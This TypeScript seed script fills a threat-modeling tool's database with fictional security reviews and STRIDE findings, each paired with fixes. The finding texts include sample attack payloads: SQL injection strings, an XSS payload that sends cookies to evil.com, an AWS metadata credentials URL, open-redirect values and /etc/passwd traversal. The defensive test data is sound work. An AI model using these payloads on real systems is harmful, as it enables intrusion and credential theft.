/**
 * Seed script for review data.
 * Creates a full chain: Tenant → Integration → Events → ContextBundles → Reviews → Findings
 *
 * Each review has realistic, differentiated findings based on actual
 * threat modeling analysis (STRIDE methodology, OWASP patterns).
 *
 * Usage: bun packages/db/prisma/seed-reviews.ts
 */
import { db } from "../src/index";

const TENANT_NAME = "Test Organization";
const WORKOS_ORG_ID = "org_01K3M4QS907CN7K366594YJPBT";

// ─── Realistic Review Data ──────────────────────────────────────────────────

interface SeedFinding {
  type: "THREAT" | "REQUIREMENT" | "MITIGATION" | "OBSERVATION";
  title: string;
  description: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
  strideCategory: string;
  effortEstimate: "LOW" | "MEDIUM" | "HIGH" | "CRITICAL";
  status: "OPEN" | "ACCEPTED" | "RESOLVED" | "REJECTED" | "DEFERRED";
}

interface SeedReview {
  title: string;
  summary: string;
  riskLevel: "CRITICAL" | "HIGH" | "MEDIUM" | "LOW" | "INFO";
  bundleStatus: "COMPLETED" | "REVIEWING";
  reviewStatus: string;
  source: "LINEAR" | "NOTION";
  externalId: string;
  findings: SeedFinding[];
}

const REVIEWS: SeedReview[] = [
  {
    title: "Authentication bypass in payment service",
    summary: "The payment service's /api/payments/process endpoint accepts requests without validating the session token when the X-Internal-Service header is present. This header was intended for service-to-service communication but is accessible from external clients. An attacker can bypass authentication entirely by adding this header to requests, gaining full access to payment processing capabilities including initiating refunds, modifying transaction amounts, and accessing payment history for all users. The vulnerability affects all payment-related endpoints that use the shared middleware.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-001",
    findings: [
      {
        type: "THREAT",
        title: "Authentication bypass via X-Internal-Service header spoofing",
        description: "External clients can add the X-Internal-Service header to requests, causing the authentication middleware to skip token validation. This grants unauthenticated access to all payment endpoints. The header check uses a simple presence check without verifying the request origin or validating a shared secret.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Unauthorized refund initiation via bypassed auth",
        description: "With authentication bypassed, an attacker can call POST /api/payments/refund with arbitrary transaction IDs and amounts, potentially draining merchant accounts. There is no secondary authorization check or amount limit on the refund endpoint beyond the authentication layer.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement mutual TLS or signed tokens for internal service auth",
        description: "Service-to-service authentication must use mutual TLS certificates or cryptographically signed service tokens rather than a spoofable HTTP header. The implementation should validate the calling service identity against an allowlist and log all inter-service calls for audit purposes.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Remove X-Internal-Service header at ingress gateway",
        description: "As an immediate mitigation, configure the API gateway/load balancer to strip the X-Internal-Service header from all inbound external requests. This prevents external clients from spoofing internal service calls while the proper mTLS solution is implemented.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "ACCEPTED",
      },
      {
        type: "OBSERVATION",
        title: "No audit logging for payment operations",
        description: "Payment processing endpoints lack structured audit logging. Even if the authentication bypass is fixed, there is no way to determine if this vulnerability was previously exploited. Recommend adding comprehensive audit trails with caller identity, IP address, and request payloads for all financial operations.",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
  {
    title: "SQL injection risk in user search endpoint",
    summary: "The GET /api/v1/users/search endpoint constructs SQL queries by directly interpolating the 'q' query parameter into a LIKE clause without parameterization. The endpoint uses a raw query builder to support full-text search across multiple columns (name, email, department). While the ORM is used elsewhere, this endpoint bypasses it for performance reasons. An attacker can inject arbitrary SQL to extract data from any table, modify records, or potentially achieve remote code execution via database-specific functions. The vulnerability is exploitable by any authenticated user with access to the user directory.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "LINEAR",
    externalId: "LOO-003",
    findings: [
      {
        type: "THREAT",
        title: "Data exfiltration via UNION-based SQL injection",
        description: "The search parameter can be injected with UNION SELECT statements to extract data from arbitrary tables including credentials, API keys, and PII. Example payload: ' UNION SELECT id, password_hash, email, null FROM users --. The response returns the injected data in the normal search results format.",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Privilege escalation via UPDATE injection",
        description: "Stacked queries are supported by the database driver, allowing an attacker to inject UPDATE statements. An attacker could modify their own role to 'admin' via: '; UPDATE users SET role='admin' WHERE id='attacker_id' --. This would grant full administrative access to the platform.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Replace raw SQL with parameterized queries",
        description: "All database queries must use parameterized statements or the ORM's query builder. The raw SQL performance optimization should be replaced with a properly indexed full-text search using PostgreSQL's tsvector/tsquery or the ORM's built-in search capabilities, which provide equivalent performance with injection safety.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Add input validation and WAF rules as interim protection",
        description: "Until the query is rewritten, add strict input validation rejecting SQL metacharacters (quotes, semicolons, comment sequences) and deploy WAF rules to block common injection patterns. Note this is defense-in-depth only; WAF bypass techniques exist and input validation alone cannot fully prevent SQL injection.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
    ],
  },
  {
    title: "Insecure direct object reference in file download API",
    summary: "The file download endpoint GET /api/files/:fileId serves files based solely on the fileId parameter without verifying that the requesting user has access to the file. File IDs are sequential integers, making enumeration trivial. Any authenticated user can download any file in the system by iterating through file IDs, including confidential HR documents, financial reports, and other tenants' data in the multi-tenant deployment. The endpoint also lacks rate limiting, enabling bulk data exfiltration. Access control is enforced only in the UI by filtering the file listing, but the download endpoint itself performs no authorization check.",
    riskLevel: "HIGH",
    bundleStatus: "REVIEWING",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-005",
    findings: [
      {
        type: "THREAT",
        title: "Cross-tenant data access via sequential file ID enumeration",
        description: "File IDs are sequential integers (1, 2, 3...). An attacker can write a simple script to iterate through all file IDs, downloading every file in the system regardless of tenant or ownership. Testing confirmed that files belonging to other tenants are accessible. No rate limiting prevents bulk enumeration.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Confidential document exposure without authorization check",
        description: "Files marked as 'confidential' or 'restricted' in the metadata are still served by the download endpoint. The access level field is only used for UI display purposes and is not enforced server-side. This includes HR documents, salary information, and legal contracts.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement server-side ownership verification on file access",
        description: "The download endpoint must verify that the requesting user belongs to the same tenant as the file owner AND has appropriate role-based permissions for the file's access level. Authorization checks must be performed in the API layer, not delegated to client-side filtering.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
      {
        type: "MITIGATION",
        title: "Replace sequential IDs with UUIDs for file resources",
        description: "Migrate file identifiers from sequential integers to UUIDs (v4) to prevent enumeration attacks. While this does not replace proper authorization (security through obscurity is insufficient), it eliminates trivial enumeration and provides defense-in-depth. Requires updating the files table primary key and all foreign key references.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "DEFERRED",
      },
    ],
  },
  {
    title: "Cross-site scripting vulnerability in comment rendering",
    summary: "The comment system renders user-submitted markdown content using a custom renderer that converts markdown to HTML. The renderer correctly handles standard markdown syntax but fails to sanitize raw HTML blocks, which markdown spec allows. An attacker can inject arbitrary JavaScript via HTML tags in comments (e.g., <img onerror>, <svg onload>, or <details ontoggle>). The XSS executes in the context of other users viewing the comment, providing access to their session tokens, enabling account takeover, or performing actions on their behalf. The vulnerability affects all pages where comments are displayed including project discussions, code reviews, and task updates.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "NOTION",
    externalId: "PAGE-002",
    findings: [
      {
        type: "THREAT",
        title: "Stored XSS via raw HTML in markdown comments",
        description: "The markdown renderer passes through raw HTML blocks without sanitization. Payloads like <img src=x onerror='fetch(`https://evil.com/steal?c=`+document.cookie)'> execute when any user views the comment. Since comments are persistent, this is stored XSS affecting all future viewers.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "Session hijacking via stolen authentication cookies",
        description: "Session tokens are stored in cookies without the HttpOnly flag. XSS payloads can read document.cookie and exfiltrate session tokens to attacker-controlled servers, enabling full account takeover without requiring the victim's password.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Integrate DOMPurify to sanitize rendered HTML output",
        description: "Add DOMPurify as a post-processing step after markdown rendering to strip all dangerous HTML elements and event handlers. Configure with ALLOWED_TAGS whitelist limiting to safe formatting elements (p, em, strong, a, code, pre, ul, ol, li, blockquote). This neutralizes both current and future XSS vectors in user content.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "REQUIREMENT",
        title: "Set HttpOnly and Secure flags on all session cookies",
        description: "All authentication cookies must be set with HttpOnly (prevents JavaScript access), Secure (HTTPS only), and SameSite=Strict flags. This prevents session token theft even if XSS vulnerabilities exist, providing defense-in-depth against session hijacking attacks.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "Content-Security-Policy header not configured",
        description: "The application does not set a Content-Security-Policy header. Adding CSP with script-src 'self' would prevent inline script execution and block XSS payloads even if sanitization is bypassed. This is a valuable defense-in-depth measure that should be implemented alongside input sanitization.",
        severity: "LOW",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Missing rate limiting on login endpoint",
    summary: "The POST /auth/login endpoint has no rate limiting, account lockout mechanism, or CAPTCHA challenge. The endpoint responds with distinct error messages for invalid username vs. invalid password, enabling username enumeration. Combined with the lack of throttling, an attacker can perform credential stuffing attacks using leaked credential databases at thousands of attempts per second. Testing confirmed that 10,000 login attempts from a single IP in 60 seconds did not trigger any blocking or alerting. The endpoint also does not log failed authentication attempts, making attack detection impossible through current monitoring.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-009",
    findings: [
      {
        type: "THREAT",
        title: "Credential stuffing attack due to unlimited login attempts",
        description: "Without rate limiting, an attacker can attempt thousands of username/password combinations per second using leaked credential databases. At observed throughput of ~500 requests/second, a database of 1 million leaked credentials could be tested against all accounts in under 30 minutes.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Username enumeration via differential error responses",
        description: "The login endpoint returns 'User not found' for invalid usernames but 'Invalid password' for valid usernames with wrong passwords. This allows attackers to compile a list of valid usernames before attempting credential attacks, significantly reducing the search space.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement progressive rate limiting on authentication endpoints",
        description: "Apply rate limiting at multiple levels: per-IP (max 10 attempts/minute), per-account (max 5 failed attempts before temporary lockout), and global (anomaly detection for distributed attacks). Use exponential backoff for repeated failures and require CAPTCHA after 3 failed attempts.",
        severity: "HIGH",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Normalize error responses to prevent enumeration",
        description: "Return a generic 'Invalid credentials' message for all authentication failures regardless of whether the username exists. Ensure response timing is constant (add artificial delay if needed) to prevent timing-based enumeration.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "OBSERVATION",
        title: "No failed login attempt logging or alerting",
        description: "Failed authentication attempts are not logged or monitored. Even if rate limiting is implemented, there is no visibility into ongoing attacks. Recommend logging all auth attempts with IP, user-agent, and timestamp, and alerting on anomalous patterns (e.g., >50 failures from one IP in 5 minutes).",
        severity: "MEDIUM",
        strideCategory: "REPUDIATION",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "Race condition in balance transfer endpoint",
    summary: "The POST /api/transfers endpoint reads the sender's balance, validates sufficiency, then debits the sender and credits the receiver in separate database operations without transactional isolation. By sending multiple concurrent transfer requests, an attacker can exploit the time-of-check-to-time-of-use (TOCTOU) gap to transfer more funds than their actual balance allows. Testing with 10 concurrent requests of $100 from an account with $100 balance resulted in all 10 succeeding, creating $900 from nothing. The vulnerability exists because the balance check and debit are not atomic, and the database isolation level is set to READ COMMITTED rather than SERIALIZABLE.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "DRAFT",
    source: "NOTION",
    externalId: "PAGE-004",
    findings: [
      {
        type: "THREAT",
        title: "Double-spend via concurrent transfer requests",
        description: "An attacker can send multiple simultaneous transfer requests that all pass the balance check before any debit is applied. With a $100 balance, sending 50 concurrent $100 transfers results in all succeeding because each request reads the original $100 balance before any write occurs. This creates money from nothing.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Negative balance exploitation for unlimited fund extraction",
        description: "Because debits succeed even when concurrent requests should have depleted the balance, accounts can reach deeply negative balances. There is no constraint preventing negative balances at the database level. An attacker could extract arbitrary amounts limited only by network throughput.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement atomic balance operations with database-level constraints",
        description: "Wrap balance check + debit + credit in a SERIALIZABLE transaction or use SELECT FOR UPDATE to acquire a row-level lock on the sender's balance before reading. Additionally, add a CHECK constraint on the balance column (balance >= 0) as a database-level safety net that prevents negative balances regardless of application logic.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Add per-user request serialization via distributed lock",
        description: "As an immediate mitigation, use a Redis-based distributed lock (SETNX with expiry) keyed on the sender's user ID. This ensures only one transfer from a given user can be in-flight at a time. While this adds latency for legitimate concurrent transfers, it eliminates the race condition until proper database-level fixes are deployed.",
        severity: "HIGH",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
    ],
  },
  {
    title: "JWT token validation bypass via algorithm confusion",
    summary: "The authentication system uses RS256 (asymmetric) JWT tokens but the token validation library accepts the algorithm specified in the JWT header without restriction. An attacker can change the algorithm in the JWT header from RS256 to HS256, then sign the token using the public key (which is publicly available) as the HMAC secret. The validation library then uses the public key as the HS256 secret, validates the signature successfully, and accepts the forged token. This allows complete authentication bypass - an attacker can forge tokens for any user including administrators by crafting JWTs with arbitrary claims and signing them with the known public key.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "PUBLISHED",
    source: "LINEAR",
    externalId: "LOO-011",
    findings: [
      {
        type: "THREAT",
        title: "Token forgery via RS256-to-HS256 algorithm substitution",
        description: "By changing the JWT header algorithm from RS256 to HS256 and signing with the RSA public key, an attacker can forge valid tokens for any user. The public key is available at /.well-known/jwks.json. Forged tokens are indistinguishable from legitimate ones once accepted by the validator.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "Full admin account takeover via forged admin JWT",
        description: "Combined with the algorithm confusion, an attacker can set the 'role' claim to 'admin' and 'sub' to any admin user ID. Since the system trusts JWT claims after signature validation, this grants complete administrative access including user management, billing, and data export.",
        severity: "CRITICAL",
        strideCategory: "ELEVATION_OF_PRIVILEGE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Pin accepted algorithms to RS256 only in JWT verification",
        description: "Configure the JWT verification library to explicitly specify algorithms: ['RS256'] and reject tokens using any other algorithm regardless of the header. This is the primary fix. Verified that the jsonwebtoken library supports the 'algorithms' option in verify() which overrides the header.",
        severity: "CRITICAL",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "OBSERVATION",
        title: "JWT library uses permissive defaults that are known-insecure",
        description: "The jsonwebtoken library version in use defaults to trusting the algorithm in the JWT header. This is a well-known vulnerability pattern (CVE-2015-9235). The library has since added warnings but maintains backward-compatible insecure defaults. Consider switching to jose library which requires explicit algorithm specification.",
        severity: "LOW",
        strideCategory: "SPOOFING",
        effortEstimate: "MEDIUM",
        status: "RESOLVED",
      },
    ],
  },
  {
    title: "Server-side request forgery in URL preview feature",
    summary: "The link preview feature fetches metadata (title, description, image) from user-supplied URLs when they paste links in messages. The server-side fetch implementation does not restrict the target URL scheme or destination IP range. An attacker can supply internal URLs (http://169.254.169.254/latest/meta-data/ for AWS metadata, http://localhost:6379/ for Redis, or internal service URLs) to access resources that should not be reachable from outside the network. The response body is partially exposed through the preview metadata fields, enabling data exfiltration from internal services. The feature runs with the application's IAM role which has access to secrets and infrastructure metadata.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "NOTION",
    externalId: "PAGE-006",
    findings: [
      {
        type: "THREAT",
        title: "AWS metadata service access via SSRF",
        description: "An attacker can supply http://169.254.169.254/latest/meta-data/iam/security-credentials/ as a preview URL to retrieve temporary AWS credentials. These credentials inherit the application's IAM role permissions which include S3, SQS, and Secrets Manager access. Response content is exposed in the preview description field.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Internal service port scanning and data access",
        description: "By varying the hostname and port in supplied URLs, an attacker can map the internal network topology and interact with internal services (Redis, Elasticsearch, internal APIs) that are not exposed to the internet. Error messages differ between open/closed ports, enabling enumeration.",
        severity: "MEDIUM",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Implement URL allowlist and block private IP ranges",
        description: "The URL fetch must validate that the resolved IP address is not in private ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, 127.0.0.0/8) after DNS resolution. Block non-HTTP(S) schemes. Consider using a dedicated isolated service with minimal IAM permissions for URL fetching.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Enforce IMDSv2 to mitigate metadata service exposure",
        description: "Enable IMDSv2 (Instance Metadata Service v2) on all EC2 instances and set the hop limit to 1. IMDSv2 requires a PUT request to obtain a session token before accessing metadata, which SSRF vulnerabilities typically cannot perform. This blocks the most critical SSRF target while the application-level fix is developed.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
    ],
  },
  {
    title: "Hardcoded API keys in client-side bundle",
    summary: "The production JavaScript bundle contains hardcoded API keys for Stripe (sk_live_*), SendGrid, and Google Maps. These keys are embedded directly in source files rather than loaded from environment variables, and survive the build process into the client-side bundle. The Stripe secret key grants full API access including the ability to issue refunds, read customer payment methods, and modify subscription plans. Browser DevTools or a simple search through the bundled JavaScript exposes these keys to any user. The keys have been active for 8 months based on git history, meaning they may already be compromised.",
    riskLevel: "HIGH",
    bundleStatus: "COMPLETED",
    reviewStatus: "APPROVED",
    source: "LINEAR",
    externalId: "LOO-014",
    findings: [
      {
        type: "THREAT",
        title: "Stripe secret key exposure enables unauthorized financial operations",
        description: "The Stripe sk_live_ key in the client bundle grants full API access. An attacker can use it to issue refunds to arbitrary accounts, read all customer payment details (last 4 digits, expiry), create charges, and modify subscriptions. This key has been exposed in the bundle for approximately 8 months per git history.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "THREAT",
        title: "SendGrid API key allows sending phishing emails from company domain",
        description: "The exposed SendGrid key can send emails from the company's verified domain. An attacker could send convincing phishing emails to customers or partners that appear to originate from the legitimate business domain, bypassing SPF/DKIM checks since SendGrid is an authorized sender.",
        severity: "MEDIUM",
        strideCategory: "SPOOFING",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
      {
        type: "REQUIREMENT",
        title: "Move all secrets to server-side environment variables",
        description: "All API keys must be loaded from environment variables and accessed only server-side. Client-side code requiring API access should proxy through backend endpoints that hold the keys. Add pre-commit hooks and CI checks scanning for high-entropy strings and known key patterns (sk_live, SG., AIza) in client-facing code.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "RESOLVED",
      },
      {
        type: "MITIGATION",
        title: "Rotate all exposed credentials immediately",
        description: "All three exposed keys must be rotated immediately. Given the 8-month exposure window, assume they are compromised. After rotation: review Stripe transaction logs for unauthorized operations, check SendGrid logs for unexpected sends, and audit Google Maps usage for quota anomalies. Set up billing alerts on all services.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "RESOLVED",
      },
    ],
  },
  {
    title: "Broken access control in tenant isolation layer",
    summary: "The multi-tenant application enforces tenant isolation through application-level middleware that sets a tenantId context variable from the user's JWT. However, several API endpoints accept a tenantId parameter in the request body or query string and use it directly for database queries without validating it against the authenticated user's tenant. An attacker authenticated in Tenant A can access data belonging to Tenant B by modifying the tenantId in API requests. The vulnerability affects 12 endpoints across the projects, billing, and reports modules. Database queries in these endpoints use the request-supplied tenantId rather than the middleware-injected one, completely bypassing tenant isolation.",
    riskLevel: "CRITICAL",
    bundleStatus: "COMPLETED",
    reviewStatus: "IN_REVIEW",
    source: "LINEAR",
    externalId: "LOO-019",
    findings: [
      {
        type: "THREAT",
        title: "Cross-tenant data access via tenantId parameter manipulation",
        description: "Endpoints like GET /api/projects?tenantId=<other_tenant> return data from other tenants. The middleware correctly sets ctx.tenantId from the JWT, but affected endpoints read tenantId from request parameters instead of the context. An attacker needs only a valid tenant ID (often guessable or sequential) to access another organization's data.",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "THREAT",
        title: "Cross-tenant data modification via billing endpoints",
        description: "The PUT /api/billing/plan endpoint accepts tenantId in the request body and updates the specified tenant's subscription without ownership verification. An attacker could downgrade competitors' plans or upgrade their own plan without payment by specifying another tenant's ID in write operations.",
        severity: "CRITICAL",
        strideCategory: "TAMPERING",
        effortEstimate: "LOW",
        status: "OPEN",
      },
      {
        type: "REQUIREMENT",
        title: "Enforce middleware-injected tenantId for all database queries",
        description: "All database queries must use the tenantId from middleware context (derived from the authenticated JWT), never from request parameters. Remove tenantId from all request body schemas and query parameter definitions. Add a linting rule or middleware check that flags any use of req.body.tenantId or req.query.tenantId.",
        severity: "CRITICAL",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "ACCEPTED",
      },
      {
        type: "MITIGATION",
        title: "Add database-level row-level security as defense-in-depth",
        description: "Implement PostgreSQL Row-Level Security (RLS) policies that filter rows by tenantId based on the current database session variable. Set the session variable from middleware before each request. This ensures tenant isolation at the database level even if application code has bugs.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "HIGH",
        status: "DEFERRED",
      },
      {
        type: "OBSERVATION",
        title: "12 endpoints confirmed vulnerable across 3 modules",
        description: "Audit identified 12 affected endpoints: 5 in projects module, 4 in billing module, 3 in reports module. All follow the same anti-pattern of reading tenantId from request input. The pattern suggests copy-paste propagation from an early template. A systematic fix should cover all endpoints, not just the identified ones.",
        severity: "HIGH",
        strideCategory: "INFORMATION_DISCLOSURE",
        effortEstimate: "MEDIUM",
        status: "OPEN",
      },
    ],
  },
];

// ─── Additional simple reviews (for volume) ─────────────────────────────────

const EXTRA_REVIEWS: Omit<SeedReview, "findings">[] = [
  { title: "Privilege escalation via role manipulation in admin panel", summary: "The admin panel's role assignment endpoint does not validate that the requesting user has higher privileges than the role being assigned. A user with 'editor' role can assign themselves 'admin' role by directly calling PUT /api/users/self/role with {role: 'admin'}. The UI correctly hides the option, but the API endpoint lacks server-side authorization checks.", riskLevel: "HIGH", bundleStatus: "COMPLETED", reviewStatus: "DRAFT", source: "LINEAR", externalId: "LOO-021", },
  { title: "Sensitive data exposure in API error responses", summary: "When database queries fail, the error handler returns the full Prisma error message including the raw SQL query, table names, column names, and in some cases partial row data. Stack traces with internal file paths are also included. This information aids attackers in understanding the database schema and crafting targeted injection attacks.", riskLevel: "MEDIUM", bundleStatus: "COMPLETED", reviewStatus: "APPROVED", source: "NOTION", externalId: "PAGE-008", },
  { title: "Insecure deserialization in webhook handler", summary: "The webhook receiver at POST /api/webhooks/process deserializes incoming JSON payloads using a custom reviver function that instantiates objects based on a '__type' field in the JSON. An attacker can craft payloads with '__type' set to internal class names, triggering constructor side effects that execute arbitrary code on the server.", riskLevel: "HIGH", bundleStatus: "COMPLETED", reviewStatus: "IN_REVIEW", source: "LINEAR", externalId: "LOO-023", },
  { title: "Unvalidated redirect in OAuth callback flow", summary: "The OAuth callback handler at /auth/callback accepts a 'redirect_to' query parameter and performs a 302 redirect to that URL after successful authentication. The parameter only checks that the URL starts with '/' but accepts protocol-relative URLs (//evil.com) and path-prefixed URLs (/../../evil.com). An attacker can craft login links that redirect authenticated users to phishing pages that steal their freshly-minted session tokens.", riskLevel: "MEDIUM", bundleStatus: "COMPLETED", reviewStatus: "DRAFT", source: "NOTION", externalId: "PAGE-010", },
  { title: "Missing CSRF protection on state-changing endpoints", summary: "POST, PUT, and DELETE endpoints do not validate CSRF tokens or check the Origin/Referer headers. Since authentication uses cookies with SameSite=Lax (which allows top-level navigation POSTs), an attacker can create a malicious page that auto-submits forms to the application's API, performing actions as the victim user.", riskLevel: "MEDIUM", bundleStatus: "REVIEWING", reviewStatus: "IN_REVIEW", source: "LINEAR", externalId: "LOO-025", },
  { title: "Insecure file upload allows arbitrary code execution", summary: "The file upload endpoint validates only the Content-Type header but not the actual file contents or extension. Attackers can upload PHP/JSP/ASPX files disguised as images. The uploaded files are stored in a publicly accessible directory served by the web server, allowing direct execution by accessing the file URL.", riskLevel: "CRITICAL", bundleStatus: "COMPLETED", reviewStatus: "IN_REVIEW", source: "NOTION", externalId: "PAGE-012", },
  { title: "Missing encryption for PII in database columns", summary: "Personal identifiable information including social security numbers, passport numbers, and bank account details are stored as plaintext in the users_pii table. The database is encrypted at rest at the volume level, but field-level encryption is absent, meaning any database query, backup, log entry, or SQL injection vulnerability exposes raw PII.", riskLevel: "HIGH", bundleStatus: "COMPLETED", reviewStatus: "APPROVED", source: "LINEAR", externalId: "LOO-027", },
  { title: "Path traversal in template rendering engine", summary: "The template engine's include directive accepts relative paths without proper sanitization. By using ../ sequences in template references, an attacker with template editing permissions can include arbitrary server files (e.g., /etc/passwd, application config files containing database credentials, .env files) in rendered output.", riskLevel: "HIGH", bundleStatus: "REVIEWING", reviewStatus: "IN_REVIEW", source: "NOTION", externalId: "PAGE-014", },
  { title: "CORS misconfiguration allows credential theft", summary: "The CORS policy reflects the request Origin header in Access-Control-Allow-Origin without validation, and sets Access-Control-Allow-Credentials: true. This means any website can make authenticated cross-origin requests to the API and read responses. An attacker can host a page that silently calls the API with the victim's cookies and exfiltrates their data.", riskLevel: "HIGH", bundleStatus: "COMPLETED", reviewStatus: "DRAFT", source: "LINEAR", externalId: "LOO-029", },
  { title: "Prototype pollution in request body processing", summary: "The request body parser uses a recursive merge function to combine default values with user input. By sending JSON with __proto__ keys, an attacker can modify Object.prototype, adding properties to all objects in the application. This can bypass security checks (e.g., adding isAdmin: true to prototype), cause denial of service, or achieve remote code execution depending on how prototype properties are consumed downstream.", riskLevel: "HIGH", bundleStatus: "COMPLETED", reviewStatus: "IN_REVIEW", source: "NOTION", externalId: "PAGE-016", },
];

// ─── Main ───────────────────────────────────────────────────────────────────

const RISK_LEVELS = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"] as const;
const BUNDLE_STATUSES = ["COMPLETED", "REVIEWING"] as const;
const REVIEW_STATUSES = ["DRAFT", "IN_REVIEW", "APPROVED"] as const;
const FINDING_TYPES = ["THREAT", "REQUIREMENT", "MITIGATION", "OBSERVATION"] as const;
const SEVERITIES = ["CRITICAL", "HIGH", "MEDIUM", "LOW"] as const;
const STRIDE = ["SPOOFING", "TAMPERING", "REPUDIATION", "INFORMATION_DISCLOSURE", "DENIAL_OF_SERVICE", "ELEVATION_OF_PRIVILEGE"] as const;

async function main() {
  console.log("Seeding review data...\n");

  // 1. Upsert tenant
